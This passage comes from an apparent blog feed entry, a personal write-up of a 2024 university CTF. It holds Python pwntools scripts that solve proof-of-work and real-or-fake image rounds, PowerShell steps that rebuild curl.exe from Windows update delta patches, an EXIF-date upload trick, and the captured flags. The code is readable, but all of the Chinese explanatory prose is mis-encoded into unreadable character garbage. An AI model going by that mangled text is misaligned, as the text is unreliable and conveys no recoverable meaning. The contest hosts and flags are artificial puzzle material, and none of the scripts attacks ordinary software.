class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_pow_solution</span>(<span class="params">challenge, solution</span>):</span><br><span class="line">    prefix = <span class="string">"0000"</span></span><br><span class="line">    guess = solution + challenge</span><br><span class="line">    guess_hash = hashlib.sha256(guess.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> guess_hash.startswith(prefix)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pow</span>(<span class="params">challenge, difficulty=<span class="number">4</span>, timeout=<span class="number">0.5</span></span>):</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> solution <span class="keyword">in</span> (<span class="string">f"<span class="subst">{i:<span class="number">0</span>{difficulty}</span>x}"</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span> ** difficulty)):</span><br><span class="line">            <span class="keyword">if</span> verify_pow_solution(challenge, solution):</span><br><span class="line">                <span class="keyword">return</span> solution</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt;= timeout:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_image</span>():</span><br><span class="line">    count = <span class="number">0</span>   </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b'Is this picture real or not (Y/N)? \n'</span>)</span><br><span class="line">        b64_image = p.recvuntil(<span class="string">b'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># compared with the local images using b64, if the image is not in the local images, save it</span></span><br><span class="line">        <span class="comment"># using a uuid as the filename</span></span><br><span class="line">        <span class="comment"># if folder is empty, save the image directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.listdir(<span class="string">'images'</span>):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f'images/<span class="subst">{uuid.uuid4()}</span>.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(base64.b64decode(b64_image))</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            save_flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(<span class="string">'images'</span>):</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f'images/<span class="subst">{filename}</span>'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">if</span> base64.b64encode(f.read()).decode() == b64_image.decode():</span><br><span class="line">                        save_flag = <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> save_flag:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f'images/<span class="subst">{uuid.uuid4()}</span>.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(base64.b64decode(b64_image))</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    info(<span class="string">f"save <span class="subst">{count}</span> images"</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'instance.penguin.0ops.sjtu.cn'</span>, <span class="number">18081</span>)</span><br><span class="line">p.send(<span class="string">b'CONNECT w44bxg7cgh48frjc:1 HTTP/1.1\r\n\r\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"solution + '"</span>)</span><br><span class="line">challenge = p.recvuntil(<span class="string">b"'"</span>, drop=<span class="literal">True</span>).decode()</span><br><span class="line">info(<span class="string">f"challenge: <span class="subst">{challenge}</span>"</span>)</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line">solution = solve_pow(challenge)</span><br><span class="line">info(<span class="string">f"solution: <span class="subst">{solution}</span>"</span>)</span><br><span class="line">p.sendline(solution.encode())</span><br><span class="line">save_image()</span><br><span class="line">p.close()</span><br></pre></td></tr></tbody></table></figure><p>è¿™é“é¢˜çš„æ ‡ç­¾æˆ‘ä¸€å¼€å§‹æ˜¯ç”¨æ¨¡å‹æ‰“çš„ï¼Œä½†æ˜¯å‡†ç¡®ç‡å¹¶ä¸é«˜ã€‚expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_pow_solution</span>(<span class="params">challenge, solution</span>):</span><br><span class="line">    prefix = <span class="string">"0000"</span></span><br><span class="line">    guess = solution + challenge</span><br><span class="line">    guess_hash = hashlib.sha256(guess.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> guess_hash.startswith(prefix)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pow</span>(<span class="params">challenge, difficulty=<span class="number">4</span>, timeout=<span class="number">0.5</span></span>):</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> solution <span class="keyword">in</span> (<span class="string">f"<span class="subst">{i:<span class="number">0</span>{difficulty}</span>x}"</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span> ** difficulty)):</span><br><span class="line">            <span class="keyword">if</span> verify_pow_solution(challenge, solution):</span><br><span class="line">                <span class="keyword">return</span> solution</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt;= timeout:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eval_image</span>():</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b'Is this picture real or not (Y/N)? \n'</span>)</span><br><span class="line">        b64_image = p.recvuntil(<span class="string">b'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(<span class="string">'images_model'</span>):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f'images_model/<span class="subst">{filename}</span>'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">if</span> base64.b64encode(f.read()).decode() == b64_image.decode():</span><br><span class="line">                    correct_answer = filename[-<span class="number">5</span>].upper()</span><br><span class="line">                    file_list.append(filename)</span><br><span class="line">                    <span class="keyword">if</span> correct_answer != <span class="string">'Y'</span> <span class="keyword">and</span> correct_answer != <span class="string">'N'</span>:</span><br><span class="line">                        correct_answer = <span class="string">'N'</span></span><br><span class="line">                    correct_answers.append(correct_answer)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b" all 20 rounds (Y/N): "</span>)</span><br><span class="line">    data = <span class="string">''</span>.join(correct_answers)</span><br><span class="line">    info(data)</span><br><span class="line">    p.sendline(data.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    correct_answers = []</span><br><span class="line">    file_list = []</span><br><span class="line">    p = remote(<span class="string">'instance.penguin.0ops.sjtu.cn'</span>, <span class="number">18081</span>)</span><br><span class="line">    p.send(<span class="string">b'CONNECT gmvfevkv2k6p982q:1 HTTP/1.1\r\n\r\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"solution + '"</span>)</span><br><span class="line">    challenge = p.recvuntil(<span class="string">b"'"</span>, drop=<span class="literal">True</span>).decode()</span><br><span class="line">    info(<span class="string">f"challenge: <span class="subst">{challenge}</span>"</span>)</span><br><span class="line">    <span class="comment"># p.interactive()</span></span><br><span class="line">    solution = solve_pow(challenge)</span><br><span class="line">    <span class="keyword">if</span> solution <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    info(<span class="string">f"solution: <span class="subst">{solution}</span>"</span>)</span><br><span class="line">    p.sendline(solution.encode())</span><br><span class="line">    eval_image()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = p.recvuntil(<span class="string">b"Incorrect answer for Round "</span>, timeout=<span class="number">0.3</span>)</span><br><span class="line">        wrong_round = p.recvuntil(<span class="string">b"."</span>, drop=<span class="literal">True</span>)</span><br><span class="line">        info(<span class="string">f"wrong_round: <span class="subst">{wrong_round}</span>"</span>)</span><br><span class="line">        wrong_round = <span class="built_in">int</span>(wrong_round)</span><br><span class="line">        wrong_filename = file_list[wrong_round - <span class="number">1</span>]</span><br><span class="line">        <span class="comment"># change the filename to the right answer(opposite of original answer)</span></span><br><span class="line">        <span class="comment"># modify the filename to the right answer</span></span><br><span class="line">        correct_answer = correct_answers[wrong_round - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> correct_answer == <span class="string">'Y'</span>:</span><br><span class="line">            correct_answer = <span class="string">'N'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            correct_answer = <span class="string">'Y'</span></span><br><span class="line">        right_filename = wrong_filename[:-<span class="number">5</span>] + correct_answer + <span class="string">'.png'</span></span><br><span class="line">        <span class="comment"># append the wrong filename to log.txt</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'log.txt'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">f'<span class="subst">{wrong_filename}</span>\n'</span>)</span><br><span class="line">        os.rename(<span class="string">f'images_model/<span class="subst">{wrong_filename}</span>'</span>, <span class="string">f'images_model/<span class="subst">{right_filename}</span>'</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>flag:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{DeepFake_1s_Ea5y_aNd_1ntere5t1ng!}</span><br></pre></td></tr></tbody></table></figure><h3 id="RealOrNotRevenge"><a href="#RealOrNotRevenge" class="headerlink" title="RealOrNotRevenge"></a>RealOrNotRevenge</h3><p>æœ¬é¢˜è€ƒå¯Ÿçš„æ˜¯è°·æ­Œè¯†å›¾çš„èƒ½åŠ›ã€‚</p><p>ä¸‹è½½å›¾ç‰‡å’Œä¹‹å‰ä¸€æ ·ï¼Œè¿™é“é¢˜æˆ‘ä¸‹è½½ä¸‹æ¥åªæœ‰86å¼ å›¾ç‰‡ã€‚æˆ‘å…¨éƒ¨æ‹¿å»è°·æ­Œè¯†å›¾ï¼Œèƒ½æœåˆ°çš„å¤§å¤šæ•°æ˜¯unsplashä¸Šçš„å›¾ç‰‡ã€‚èƒ½æœåˆ°çš„æˆ‘éƒ½æ ‡è®°Yï¼Œæœä¸åˆ°çš„éƒ½æ ‡è®°Nã€‚å‡†ç¡®ç‡ä¼¼ä¹æé«˜ã€‚ã€‚ã€‚è·‘ä¸ªå‡ æ¬¡å°±å‡ºflagäº†ã€‚å› æ­¤ä¸»è¦å·¥ä½œé‡åœ¨äºæˆ‘æ‰‹åŠ¨è°·æ­Œè¯†å›¾ï¼Œä½†æ˜¯åº”è¯¥å¯ä»¥å†™ä»£ç è°ƒç”¨APIï¼Ÿ</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_pow_solution</span>(<span class="params">challenge, solution</span>):</span><br><span class="line">    prefix = <span class="string">"00000"</span></span><br><span class="line">    guess = solution + challenge</span><br><span class="line">    guess_hash = hashlib.sha256(guess.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> guess_hash.startswith(prefix)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pow</span>(<span class="params">challenge, difficulty=<span class="number">5</span>, timeout=<span class="number">3</span></span>):</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> solution <span class="keyword">in</span> (<span class="string">f"<span class="subst">{i:<span class="number">0</span>{difficulty}</span>x}"</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span> ** difficulty)):</span><br><span class="line">            <span class="keyword">if</span> verify_pow_solution(challenge, solution):</span><br><span class="line">                <span class="keyword">return</span> solution</span><br><span class="line">        <span class="keyword">if</span> time.time() - start_time &gt;= timeout:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eval_image</span>():</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b'Is this picture real or not (Y/N)? \n'</span>)</span><br><span class="line">        b64_image = p.recvuntil(<span class="string">b'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(<span class="string">'images_model'</span>):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f'images_model/<span class="subst">{filename}</span>'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">if</span> base64.b64encode(f.read()).decode() == b64_image.decode():</span><br><span class="line">                    correct_answer = filename[-<span class="number">5</span>].upper()</span><br><span class="line">                    file_list.append(filename)</span><br><span class="line">                    <span class="keyword">if</span> correct_answer != <span class="string">'Y'</span> <span class="keyword">and</span> correct_answer != <span class="string">'N'</span>:</span><br><span class="line">                        correct_answer = <span class="string">'N'</span></span><br><span class="line">                    correct_answers.append(correct_answer)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b" all 20 rounds (Y/N): "</span>)</span><br><span class="line">    data = <span class="string">''</span>.join(correct_answers)</span><br><span class="line">    info(data)</span><br><span class="line">    p.sendline(data.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    correct_answers = []</span><br><span class="line">    file_list = []</span><br><span class="line">    p = remote(<span class="string">'instance.penguin.0ops.sjtu.cn'</span>, <span class="number">18081</span>)</span><br><span class="line">    p.send(<span class="string">b'CONNECT 6gmer7hwgjkkh6fc:1 HTTP/1.1\r\n\r\n'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"solution + '"</span>)</span><br><span class="line">    challenge = p.recvuntil(<span class="string">b"'"</span>, drop=<span class="literal">True</span>).decode()</span><br><span class="line">    info(<span class="string">f"challenge: <span class="subst">{challenge}</span>"</span>)</span><br><span class="line">    <span class="comment"># p.interactive()</span></span><br><span class="line">    solution = solve_pow(challenge)</span><br><span class="line">    <span class="keyword">if</span> solution <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    info(<span class="string">f"solution: <span class="subst">{solution}</span>"</span>)</span><br><span class="line">    p.sendline(solution.encode())</span><br><span class="line">    eval_image()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(file_list))</span><br><span class="line">    response = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'flag'</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></tbody></table></figure><p>flag:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{Revenge_1s_Ea5y_aNd_1ntere5t1ng!}</span><br></pre></td></tr></tbody></table></figure><h3 id="f-and-r"><a href="#f-and-r" class="headerlink" title="f and r"></a>f and r</h3><p>æœ¬é¢˜è€ƒå¯Ÿçš„æ˜¯ä¿¡æ¯æ£€ç´¢èƒ½åŠ›å’ŒåŠ¨æ‰‹èƒ½åŠ›ã€‚</p><p>å‡ ä¹å…¨é è¿™ç¯‡æ–‡ç« ï¼š</p><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html</a></p><p>æ ¹æ®æ–‡ç« æåˆ°çš„æ­¥éª¤æŠŠmsué‡Œé¢çš„cabæå–å‡ºæ¥ï¼š</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir content</span><br><span class="line">expand.exe <span class="operator">-F</span>:* <span class="string">".\windows10.0-kb114514-x64.msu"</span> ./content</span><br><span class="line"><span class="built_in">cd</span> content</span><br><span class="line">mkdir content</span><br><span class="line">expand.exe <span class="operator">-F</span>:* <span class="string">".\Windows10.0-KB114514-x64.cab"</span> ./content</span><br><span class="line"><span class="built_in">cd</span> content</span><br><span class="line">mkdir content</span><br><span class="line">expand.exe <span class="operator">-F</span>:* <span class="string">".\Windows10.0-KB114514-x64.cab"</span> ./content</span><br><span class="line"><span class="built_in">cd</span> content</span><br><span class="line">mkdir content</span><br><span class="line">expand.exe <span class="operator">-F</span>:* <span class="string">".\Cab_for_KB114514_PSFX.cab"</span> ./content</span><br></pre></td></tr></tbody></table></figure><p>å‘ç°få’Œræ–‡ä»¶å¤¹ä¸‹éƒ½æœ‰curl.exeã€‚é‚£ä¹ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯ä»deltaå’Œcurl.exeæ¢å¤å‡ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>éœ€è¦åˆ©ç”¨ä½œè€…ç¼–å†™çš„delta_patch.pyã€‚ä½†æ˜¯ç›´æ¥å°†é¢˜ç›®ç»™çš„få’Œrå–‚è¿›å»æ˜¯è¡Œä¸é€šçš„ã€‚</p><p>æ–‡ä¸­æœ‰è¿™ä¹ˆä¸€æ®µï¼š</p><blockquote><p>To generate the binaries I want Iâ€™m going to apply the reverse delta and then each forward delta, creating two output files:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; python X:\Patches\tools\delta_patch.py -i ntoskrnl.exe -o ntoskrnl.2020-07.exe .\r\ntoskrnl.exe X:\Patches\x64\1903\2020\2020-07\x64\os-kernel_10.0.18362.959\f\ntoskrnl.exe</span><br><span class="line">Applied 2 patches successfully</span><br><span class="line">Final hash: zZC/JZ+y5ZLrqTvhRVNf1/79C4ZYwXgmZ+DZBMoq8ek=</span><br><span class="line">PS &gt; python X:\Patches\tools\delta_patch.py -i ntoskrnl.exe -o ntoskrnl.2020-08.exe .\r\ntoskrnl.exe X:\Patches\x64\1903\2020\2020-08\x64\os-kernel_10.0.18362.1016\f\ntoskrnl.exe</span><br><span class="line">Applied 2 patches successfully</span><br><span class="line">Final hash: UZw7bE231NL2R0S4yBNT1nmDW8PQ83u9rjp91AiCrUQ=</span><br></pre></td></tr></tbody></table></figure></blockquote><p>ä½•æ„å‘¢ï¼Œç›®æµ‹æ˜¯è¯´ï¼š</p><p>æˆ‘ä»¬æœ‰ä¸€ä¸ªæ¯”è¾ƒæ–°çš„æ–‡ä»¶ï¼Œä¸€ä¸ªæ—§è¡¥ä¸ï¼Œä¸€ä¸ªå¤„äºä¸­é—´çš„è¡¥ä¸ã€‚åˆ©ç”¨æ—§è¡¥ä¸çš„rå›åˆ°æ—§ç‰ˆæœ¬ï¼Œå†ç”¨ä¸­é—´è¡¥ä¸çš„få°±å¯ä»¥ç”Ÿæˆä¸­é—´ç‰ˆæœ¬ã€‚</p><p><code>update.mum</code>é‡Œé¢æœ‰ä¸€ä¸²ç½‘å€ï¼š<code>https://support.macrohard.com/help/5034203</code></p><p>å¥½å¥½å¥½æŠŠå·¨ç¡¬æ”¹æˆå¾®è½¯ï¼Œå‘ç°æ˜¯KB5034203æ›´æ–°ï¼Œé‚£å°±æŠŠè¿™ä¸ªmsuä¸‹è½½ä¸‹æ¥ï¼Œæå–å‡ºå…¶ä¸­curlçš„få’Œrã€‚</p><p>ç„¶åç”¨KB5034203çš„rå›æ»šåˆ°æ—§ç‰ˆæœ¬ï¼Œç”¨é¢˜ç›®ç»™çš„fç”Ÿæˆæˆ‘ä»¬è¦çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python delta_patch.py <span class="literal">-i</span> curl.exe <span class="literal">-o</span> curl.patched.exe .\kb5034203\r\curl.exe .\kb114514\amd64_curl_0o0o0o0o0o0o0o0_10.<span class="number">0.19041</span>.<span class="number">9999</span>_none_0o0o0o0o0o0o0o0\f\curl.exe</span><br><span class="line">.\curl.patched.exe <span class="literal">--version</span></span><br></pre></td></tr></tbody></table></figure><p>å¾—åˆ°flag:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{ dc1d03c554150a cedca6d71ce394 }</span><br></pre></td></tr></tbody></table></figure><p>å»æ‰ç©ºæ ¼å³å¯ã€‚</p><h3 id="Boyâ€™s-Bullet"><a href="#Boyâ€™s-Bullet" class="headerlink" title="Boyâ€™s Bullet"></a>Boyâ€™s Bullet</h3><p>æœ¬é¢˜è€ƒæŸ¥å›¾ç‰‡exifç¼–è¾‘èƒ½åŠ›å’Œé˜…è¯»ç†è§£èƒ½åŠ›ã€‚</p><p>å›æ—‹é•–æ˜¯å§ã€‚2000å¹´å‡ºç”Ÿçš„ç”·å­©24å²å¼€æª38å²å™¶äº†ï¼Œæˆ‘ä½œä¸ºä¸€ä¸ª2024å¹´å‡ºç”Ÿçš„ç…§ç‰‡ä¹Ÿåº”è¯¥38å²æ—¶å™¶ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯2062å¹´ã€‚åˆšå¼€å§‹è¿™ä¸ªæ—¶é—´æˆ³æ²¡ææ˜ç™½å•¥æ„æ€ï¼Œä¸€å¼€å§‹æ–‡ä»¶åé‡Œå¸¦æ—¶é—´é”™ï¼Œåæ¥åœ¨å›¾ç‰‡é‡ŒåŠ æ—¶é—´æˆ³ï¼Œåæ¥æ‰çŒ›åœ°æƒ³èµ·exifä¹Ÿæœ‰æ—¶é—´æˆ³ã€‚</p><p>ç”¨è¿™ä¸ª<a href="https://thexifer.net/">ç½‘ç«™</a>éšä¾¿ä¿®æ”¹äº†ä¸€å¼ å›¾ç‰‡çš„exifä¿¡æ¯ï¼ˆModify Dateï¼‰ï¼Œç„¶åä¸Šä¼ ï¼š</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -T 2062.jpeg http://111.186.57.85:10038</span><br></pre></td></tr></tbody></table></figure><p>å°±èƒ½å¾—åˆ°flag: </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag{47_7h15_m0m3n7_3duc4710n_h45_c0mp1373d_4_72u1y_c1053d_100p}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://bu.dusays.com/2024/04/26/662b4a0a87f47.png" class="lazyload" data-srcset="https://bu.dusays.com/2024/04/26/662b4a0a87f47.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="result"></p><p>æ²¡è®°flagï¼Œå­¦æ ¡é‚£ä¸ªè«åè¿ä¸ä¸Šï¼Œæ¢geekctfå¤ç°çš„ã€‚</p>]]></content>
    
    
    <summary type="html">2024å¹´äº¤å¤§ CTF æ ¡å†…èµ›ä¸ªäººé¢˜è§£ã€‚</summary>
    
    
    
    <category term="CTF" scheme="https://blog.beacox.space/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://blog.beacox.space/tags/PWN/"/>
    
    <category term="Misc" scheme="https://blog.beacox.space/tags/Misc/"/>
    
